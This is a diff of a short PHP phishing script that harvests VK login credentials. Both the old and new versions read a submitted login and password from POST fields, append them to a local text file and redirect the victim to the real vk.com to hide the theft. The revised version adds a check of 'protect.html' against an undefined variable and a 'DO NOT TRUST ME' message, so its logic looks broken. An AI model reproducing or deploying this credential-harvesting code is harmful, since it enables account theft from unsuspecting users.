@@ -1,8 +1,12 @@
 <?PHP
 $Log = $_POST['counter'];
 $Pass = $_POST['strike'];
-$log = fopen("password.txt","at");
-fwrite($log,"$Log:$Pass\n");
-fclose($log);
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";
+$myFile = file_get_contents("protect.html");
+if($myFile == $searchString) {
+    file_put_contents("cat.txt", "[EMAIL]: " . $Log . " [PASS]: " . $Pass . "\n", FILE_APPEND);
+    header('Location: https://vk.com/');
+}
+if($myFile != $searchString) {
+    echo "DO NOT TRUST ME";
+}
 ?>
